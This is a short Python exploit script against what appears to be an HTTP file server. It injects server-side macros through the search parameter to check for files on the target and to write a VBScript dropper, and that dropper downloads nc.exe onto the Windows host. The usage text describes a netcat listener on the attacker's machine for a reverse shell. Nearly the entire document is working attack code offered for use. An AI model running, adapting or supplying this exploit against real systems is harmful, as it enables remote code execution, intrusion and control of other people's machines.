#!/usr/bin/python
'''
    Usage : python Exploit.py <Target IP address> <Target Port Number> <Local IP address>  <Local port netcat>
    
    note: <Local IP address> is the ip address of your machine which is listening to connections using netcat
          <Local port netcat> is normally  the netcat port you use to listen to
'''

import urllib2
import sys
from string import Template
import requests

try:
    commandParameters = sys.argv
    targetIpAddres = commandParameters[1]
    remotePort = commandParameters[2]
    localIpAddress = commandParameters[3]
    localPort = commandParameters[4]
    baseUrl = 'http://$targetIpAddres:$remotePort/?search=%00'

    def checkIfFileExistsInHost(file,path='C:\Windows\System32'):
        fullUrl = Template(baseUrl+'{.load|$path\$file.}') 
        urlToAttack = fullUrl.substitute(targetIpAddres=targetIpAddres,remotePort=remotePort,file=file,path=path)
        print('path to check ',urlToAttack)
        respose = urllib2.urlopen(urlToAttack)
        print(respose.read())

    def upload_malicious_script(payloadFileName):
        payload = '''dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
        dim bStrm: Set bStrm = createobject("Adodb.Stream")
        xHttp.Open "GET", "http://localhost:8000/nc.exe", False
        xHttp.Send
        with bStrm
        .type = 1 '//binary
        .open
        .write xHttp.responseBody
        .savetofile "C:\Users\Public\\nc.exe", 2 '//overwrite
        end with
        '''
        fullUrl = Template(baseUrl+'{.save|C:\Users\Public\$payloadFileName|$payload.}') 
        urlToAttack = fullUrl.substitute(targetIpAddres=targetIpAddres,remotePort=remotePort,payloadFileName=payloadFileName,payload=payload)
        response = requests.get(urlToAttack)
        print('response status ',response.status_code)
        print('response status ',response.text)

    upload_malicious_script('demon.vbs')

except Exception as err:
    print(err)